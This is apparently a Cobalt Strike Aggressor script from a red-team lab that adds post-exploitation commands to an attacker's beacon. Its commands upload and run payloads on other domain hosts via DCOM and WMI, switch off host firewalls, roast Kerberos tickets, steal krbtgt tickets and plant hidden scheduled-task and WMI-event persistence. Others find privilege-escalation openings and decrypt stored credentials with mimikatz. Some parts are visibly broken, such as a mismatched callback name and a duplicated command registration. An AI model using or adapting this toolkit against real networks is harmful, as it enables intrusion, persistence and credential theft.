# $1 is beacon id
# $2 target
# $3 selected listener

#GLOBAL VARIABLES
$SHARPWMI_BIN_PATH  = getFileProper("C:\\Tools\\SharpWMI\\SharpWMI\\bin\\Release","SharpWMI.exe");
$INVOKE_DCOM_PATH   = getFileProper("C:\\Tools","Invoke-DCOM.ps1");
$POWERVIEW_PATH     = getFileProper("C:\\Tools\\PowerSploit\\Recon", "PowerView.ps1");
$RUBEUS_PATH        = getFileProper("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release","Rubeus.exe");
$SEATBELT_PATH      = getFileProper("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release","Seatbelt.exe");
$ADSEARCH_PATH      = getFileProper("C:\\Tools\\ADSearch\\ADSearch\\bin\\Release","ADSearch.exe");
$SHAREPERSIST_PATH  = getFileProper("C:\\Tools\\SharPersist\\SharPersist\\bin\\Release","SharPersist.exe");
$SHARPUP_PATH       = getFileProper("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release","SharpUp.exe");
$GETSERVICEACL_PATH = getFileProper("c:\\Tools","Get-ServiceAcl.ps1");
$POWERLURK_PATH     = getFileProper("C:\\Tools","PowerLurk.ps1");

#TEST FUNCTION
command beacons {
   local('$entry $key $value');
   foreach $entry (beacons()) {
      println("== " . $entry['id'] . " ==");
      foreach $key => $value ($entry) {
         println("$[20]key : $value");
      }
      println();
   }
}

#generate random printable text of $length
sub rand_alphanum {
    local('$length $out $charstr $i $index');
    $length = $1;
    $charstr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890';
    $out = '';
    for($i = 0; $i < $length; $i++)
    {
        $index = rand(strlen($charstr));
        $out = $out . substr($charstr, $index, $index + 1);
    }
    return $out;
}

#ADD INVOKE_DCOM TO JUMP COMMAND
sub invoke_dcom
{
    local('$handle $script $oneliner $filename $payload');

    #beacon acknowledgement
    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via INVOKE_DCOM");

    #import the script
    $handle = openf($INVOKE_DCOM_PATH);
    $script = readb($handle, -1);
    closef($handle);

    #send script to beacon
    $oneliner = beacon_host_script($1, $script);

    #generate payload (stageless)
    $payload = artifact_payload($3, "exe", "x64");
    $filename = rand_alphanum(4) . ".exe";

    #upload payload to target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\ $+ $filename $+ ", $payload);

    println("Invoke-DCOM Oneliner: " . $oneliner);
    println("Filename: ". $filename);
    #execute script from powerpick
    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\ $+ $filename $+ ", $oneliner);

    #link if p2p beacon
    beacon_link($1, $2, $3);
}
beacon_remote_exploit_register("invoke-dcom", "x64", "Uses invoke_dcom.ps1 to run remote beacon", &invoke_dcom)

#ADD INVOKE-DCOM TO REMOTE-EXEC COMMAND
sub invoke_dcom_remoteexec
{
    local('$handle $script $oneliner');

    #beacon acknowledgement
    btask($1, "Task Beacon to run remote-exec on $2 via INVOKE_DCOM");

    #import the script
    $handle = openf($INVOKE_DCOM_PATH);
    $script = readb($handle, -1);
    closef($handle);

    #send script to beacon
    $oneliner = beacon_host_script($1, $script);

    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command  $+ $3 $+ ", $oneliner);
}
beacon_remote_exec_method_register("invoke-dcom", "Remote execute via powershell Invoke-DCOM", &invoke_dcom_remoteexec);

#ADD SHARPWMI TO JUMP COMMAND
sub sharpwmi
{
    local('$binpath $uploadpath $filename $args $payload')

    #beacon acknowledgement
    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via SharpWMI");
    println("Running jump sharpwmi.")

    #define binary path
    $binpath = $SHARPWMI_BIN_PATH;

    #generate payload (stageless)
    $payload = artifact_payload($3, "exe", "x64");
    $filename = rand_alphanum(4) . ".exe";

    #upload payload to target
    $uploadpath = "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\ $+ $filename $+ ";
    println("Uploading binary to:" . $uploadpath);
    bupload_raw($1, $uploadpath, $payload);

    #execute script from powerpick
    $args = "action=exec computername= $+ $2 $+  command= $+ $uploadpath $+ ";
    println("Execution args: " . $args);
    bexecute_assembly($1, $binpath, $args);

    #link if p2p beacon
    beacon_link($1, $2, $3);
}
beacon_remote_exploit_register("sharpwmi", "x64", "Uses SharpWMI to run remote beacon", &sharpwmi)

alias import_powerview {
    bpowershell_import($1, $POWERVIEW_PATH);
}
beacon_command_register(
    "import_powerview",
    "Imports Powerview into current beacon"
);

#FIREWALL ALIASES
alias shieldsdown {
    #This function creates a service on the remote host, starts it, and cleans it up.
    bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
}
beacon_command_register(
    "shieldsdown",
    "Disables host firewall"
);

alias openport {
    #powerpick new-netfirewallrule -displayname "8445-INBOUND" -Direction inbound -protocol tcp -action allow -localport 8445
    bpowerpick($1, "powerpick new-netfirewallrule -displayname \" $+ $2 $- -INBOUND\" -Direction inbound -protocol tcp -action allow -localport  $+ $2 $- ")
}
beacon_command_register(
    "openport",
    "Opens the port specified",
    "Opens the port specified"
);

#EXECUTE ASSEMBLY ALIAS
alias rubeus {
    bexecute_assembly($1, $RUBEUS_PATH, $2)
}
beacon_command_register(
    "rubeus",
    "Execute Assmembly of Rubeus",
    "Execute Assmembly of Rubeus\n\nArgs must be wrapped in double quotes"
);

alias seatbelt {
    bexecute_assembly($1, $SEATBELT_PATH, $2)
}
beacon_command_register(
    "seatbelt",
    "Execute Assmembly of Seatbelt",
    "Execute Assmembly of Seatbelt\n\nArgs must be wrapped in double quotes"
);

alias adsearch {
    bexecute_assembly($1, $ADSEARCH_PATH, $2)
}
beacon_command_register(
    "adsearch",
    "Execute Assmembly of ADSearch",
    "Execute Assmembly of ADSearch\n\nArgs must be wrapped in double quotes"
);

#KERBEROASTING
#FIND TARGETS
alias kerberoast_findtargets {
    bpowerpick($1, 'Get-NetUser -SPN | select serviceprincipalname,userprincipalname');
}
beacon_command_register(
    "kerberoast_findtargets",
    "User PowerView to find SPNs"
);

#GRABBING KRB5TGS HASH
sub kerberoast_tgsreq_cb{
    blog($1, $2);
    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 13100 hashes.txt wordlist.txt'");
    blog($1, "Cracking with John:'john --format=krb5tgs --wordlist=wordlist <user>'");
}
alias kerberoast_tgsreq{
    bexecute_assembly($1, $RUBEUS_PATH, 'kerberoast /nowrap /user:' . $2, $null, &kerberoast_tgsreq_cb);
}
beacon_command_register(
    "kerberoast_tgsreq",
    "Request the TGS with Rubeus"
);

#AS-REP ROASTING
#FIND TARGETS
alias asreproast_findtargets {
   bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname');
}
beacon_command_register(
    "asreproast_findtargets",
    "Find AS-REP roastable targets"
);

#REQUEST HASH
sub asreproast_requesthash_cb {
    blog($1, $2);
    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 18200 hashes.txt wordlist.txt'");
    blog($1, "Cracking with John:'john --format=krb5asrep --wordlist=wordlist <user>'");
}
alias asreproast_requesthash {
    bexecute_assembly($1, $RUBEUS_PATH, 'asreproast /nowrap /user:' . $2, $null, &asreproast_requesthash_cb);
}
beacon_command_register(
    "asreproast_findtargets",
    "Get the specified user KRB5ASREP hash"
);

#UNCONSTRAINED DELEGATION
#FINDING TARGETS
alias unconstdel_findtargets {
    bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname')
}

#CONSTRAINED DELEGATION
#FINDING TARGETS
alias constdel_findtargets {
    bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(&(objectCategory=computer)(msds-allowedtodelegateto=\*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
}
beacon_command_register(
    "constdel01_findtargets",
    "Find Constrained Delegation Targets"
);

#TRIAGE THEN DUMP TGT
sub constdel_stealtgt_cb {
    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
    local('$hostname $regx_luid $luid');

    $hostname = lc(binfo($1, "computer"));
    #println("hostname: " . $hostname);

    $regx_luid = '(0x\w+).*' . $hostname . '\$';
    
    $luid = matches($2, $regx_luid)[0];

    blog($1, $2);
    blog($1, "Targetting LUID:" . $luid);

    #dump ticket for krbtgt with $luid
    bexecute_assembly($1, $RUBEUS_PATH, "dump /nowrap /service:krbtgt /luid:" . $luid);
}
alias constdel02_stealtgt {
    #execute assembly and pass results to helper sub, run LUID
    bexecute_assembly($1, $RUBEUS_PATH, "triage /service:krbtgt", $null, &constdel02_stealtgt_cb);
}
beacon_command_register(
    "constdel02_stealtgt",
    "Steal the local machine TGT"
);

#ROLE BASED CONSTRAINED DELEGATION
#FINDING TARGETS
alias rbcd_findtargets {
    bpowerpick($1, 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }');
}
beacon_command_register(
    "rbcd_findtargets",
    "Find Role Based Constrained Delegation Machines");


#PERSISTANCE METHODS
## SCHEDULED TASKS
#execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64>" -n "Updater" -m add -o hourly
alias persist_schtask {
    $rand = rand_alphanum(4);
    
    #not encoding properly!
    $b64payload = base64_encode($2);
    
    blog($1, "Encoding " . $2);
    blog($1, "Base64: " . $b64payload);

    $parameters = '-t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"';
    $parameters = $parameters . ' -a "-nop -w hidden -enc ' . $b64payload. '"';
    $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
    blog($1, "Executing SharPersist " . $parameters);

    bexecute_assembly($1, $SHAREPERSIST_PATH, $parameters);
}
beacon_command_register(
    "persist_schtask",
    "Install a backdoored scheduled task",
    "Usage: persist_schtask [powershell commands]"
);

##WMI EVENTS
alias persist_wmievent{
    #$1 beaconid
    #$2 name
    #$3 processname
    #$4 listener

    #check if beacon is elevated
    if(-isadmin $1){
        #beacon acknowledgement
        btask($1, "Task Beacon to register WMI Event");

        #import the script
        $handle = openf($POWERLURK_PATH);
        $script = readb($handle, -1);
        closef($handle);

        #send script to beacon
        $oneliner = beacon_host_script($1, $script);

        #generate payload (stageless)
        $payload = artifact_payload($4, "exe", "x64");
        $filename = rand_alphanum(4) . ".exe";

        #upload payload to target
        $upload_path = "C:\\Windows\\Temp\\ $+ $filename $+ ";
        bupload_raw($1, $upload_path , $payload);

        bpowerpick($1, "Register-MaliciousWmiEvent -EventName $2 -PermanentCommand \" $+ $upload_path $+ \" -Trigger ProcessStart -ProcessName $3", $oneliner);
    } else {
        berror($1, "Can only be run from elevated access.");
    }
}
beacon_command_register(
    "persist_wmievent",
    "Use PowerLurk to reate triggers for wmi events",
    "Usage: persist_wmievent [Name] [ProcessName] [listener]"
)

#PRIVILEGE ESCALATION HELPERS
##UNQUOTED SERVICE PATHS
alias privesc_unquotedpath {
    bexecute_assembly($1, $SHARPUP_PATH, "audit UnquotedServicePath");
}
beacon_command_register(
    "privesc_unquotedpath",
    "Checkes Unquoted Paths",
    "Uses SharpUp to check for unquoted service paths"
);

##WEAK SERVICE PERMS
sub privesc_weaksvcperms_cb {
    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
    local('$regx_service $service $script $oneliner');
    
    $regx_service = '\sService \'(\w+)\'';
    
    $services = matches($2, $regx_service);
    
    blog($1, $2);

    foreach $service ($services) {
        blog($1, "Vulnerable Services: ". $service);

        #import the script
        $handle = openf($GETSERVICEACL_PATH);
        $script = readb($handle, -1);
        closef($handle);

        #send script to beacon
        $oneliner = beacon_host_script($1, $script);

        bpowerpick($1, "get-serviceacl -name " . $service . " | select -expand Access", $oneliner);

    }
}
alias privesc_weaksvcperms {
    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServices", $null, &privesc_weaksvcperms_cb);
}
beacon_command_register(
    "privesc_weaksvcperms",
    "Checkes for weak service permissions",
    "Uses SharpUp to check for weak service permissions"
);

##WEAK SERVICE BINARY PERMS
sub privesc_weaksvcbinaryperms_cb {
    blog($1, $2);
    blog($1, "Use 'powerpick get-acl -Path <binpath> | fl' to check permissions");
    
}

alias privesc_weaksvcbinaryperms {
    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServiceBinaries", $null, &privesc_weaksvcbinaryperms_cb);
}
beacon_command_register(
    "privesc_weaksvcbinaryperms",
    "Checkes for weak service binary permissions",
    "Uses SharpUp to check for weak service binary permissions"
);

#DPAPI HACKAGE
##STORED USER CREDS
###FIND VAULTS
sub dpapi_findvaults_cb{
    blog($1, $2);
    blog($1, "Check for potential creds to target.");
}
alias dpapi_findvaults {
    bexecute_assembly($1, $SEATBELT_PATH, "WindowsVault", $null, &dpapi_findvaults_cb);
}
beacon_command_register("dpapi_findvaults", "Locate DPAPI Vaults w/ Seatbelt");

###FIND CREDENTIAL FILS
sub dpapi_findcredfiles_cb{
    blog($1, $2);
    blog($1, "Note the master key guid\nUse 'powerpick get-domainuser bfarmer | select -expand objectsid' to get userSID");
}
alias dpapi_findcredfiles {
    bexecute_assembly($1, $SEATBELT_PATH, "WindowsCredentialFiles", $null, &dpapi_findcredfiles_cb);
}
beacon_command_register("dpapi_findcredfiles", "Locate DPAPI Vaults w/ Seatbelt");

###REQUEST MASTERKEY FROM DC VIA RPC
alias dpapi_reqBackupMasterKey {
    #   C:\Users
    #$2 \bfarmer (username)
    #   \AppData\Roaming\Microsoft\Protect
    #$3 \S-1-5-21-569305411-121244042-2357301523-1104 (User SID)
    #$4 \bfc5090d-22fe-4058-8953-47f6882f549e (Master Key)
    
    $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Roaming\\Microsoft\\Protect\\ $+ $3 $+ \\ $+ $4 $+ ";
    println("CredPath: " . $credpath);
    bmimikatz($1, "@dpapi::masterkey /in: $+ $credpath $+  /rpc");
}
beacon_command_register(
    "dpapi_reqBackupMasterKey",
    "Use mimikatz to request backup Masterkey from DC",
    "Usage: dpapi_reqBackupMasterKey [userid] [userSID] [MasterKeyGUID]"
);

###DECRYPT CREDENTIAL FILE
alias dpapi_decryptCredFile {
    #$2 (username)
    #$3 (Credential File UID)
    #$4 (master key)

    $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Local\\Microsoft\\Credentials\\ $+ $3 $+ ";
    bmimikatz($1, "dpapi::cred /in: $+ $credpath $+  /masterkey: $+ $4 $+ ");
}
beacon_command_register(
    "dpapi_decryptCredFile",
    "Decrypte Credential with DPAPI Master Key",
    "Usage: dpapi_decryptCredFile [username] [Cred File UID] [MasterKey]"
);

##STORED SCHEDULED TASK CREDS
###FIND CREDENTIAL FILES
$files = @();
$masterkey = '';
sub dpapi_schtask_listCredFiles_mimicred_cb {
    #$1 = beacon ID, $2 = results, $3 = information map
    #guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
    local('$regex');
    $regex = 'guidMasterKey.*\{(.*)\}';
    $masterkey = matches($2, $regex)[0];
    println("dpapi_schtask_listCredFiles_mimicred_cb - Master Key: " . $masterkey);
    println("dpapi_schtask_listCredFiles_mimicred_cb - File: " . $files);
}
sub dpapi_schtask_listCredFiles_lscb {
    #$1 = beacon ID, $2 = the folder, $3 = results
    local('$regex');
    $regex = '(\p{XDigit}{32})';
    $files = matches($3, $regex);
    # blog($1, "Found Credential Files: " . $files);
    foreach $file ($files){
        bmimikatz($1, "dpapi::cred /in: $+ $path $+ \\ $+ $file $+ ",$null,$null,&dpapi_schtask_listCredFiles_mimicred_cb);
        println("dpapi_schtask_listCredFiles_lscb - Master Key: " . $masterkey);
        println("dpapi_schtask_listCredFiles_lscb - File: " . $files);
    }
}
alias dpapi_schtask_listCredFiles {
    $path = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials";
    bls($1, $path, &dpapi_schtask_listCredFiles_lscb);
    println("dpapi_schtask_listCredFiles - Master Key: " . $masterkey);
    println("dpapi_schtask_listCredFiles - File: " . $files);

    
}
beacon_command_register(
    "dpapi_schtask_listCredFiles",
    "List Scheduled Task Credential Files"
)
